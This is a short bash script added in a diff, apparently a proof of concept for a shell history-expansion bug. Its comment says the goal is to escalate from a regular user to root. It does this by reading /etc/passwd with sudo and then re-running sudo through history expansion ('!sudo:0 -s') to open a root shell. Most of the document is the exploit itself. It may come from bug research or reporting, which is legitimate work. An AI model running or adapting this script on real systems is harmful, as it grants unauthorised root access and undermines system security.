@@ -1,0 +1,16 @@
+#!/usr/bin/env bash
+
+# Note: If we can break out of single quotes using this bug,
+# then we can potentially privilege escalate from code running
+# as a regular user to root, assuming the interactive shell in
+# question has executed a sudo command at some point
+
+
+# execute a shell
+bash -i << "EOF"
+sudo cat /etc/passwd >/dev/null
+ls
+cowsay boop
+!sudo:0 -s
+EOF
+
